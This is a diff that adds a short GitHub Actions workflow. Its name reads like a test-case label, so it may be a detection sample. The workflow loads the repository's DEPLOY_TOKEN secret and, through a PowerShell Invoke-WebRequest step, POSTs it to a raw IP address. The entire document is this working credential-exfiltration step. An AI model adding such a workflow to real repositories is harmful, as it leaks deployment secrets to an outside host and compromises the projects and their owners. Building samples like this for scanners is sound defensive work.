@@ -1,0 +1,10 @@
+name: Workflow env secret to raw IP via PowerShell
+on: workflow_dispatch
+env:
+  TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+jobs:
+  send:
+    runs-on: windows-latest
+    steps:
+      - shell: pwsh
+        run: Invoke-WebRequest -Uri "http://45.33.32.156/x" -Method POST -Body $env:TOKEN
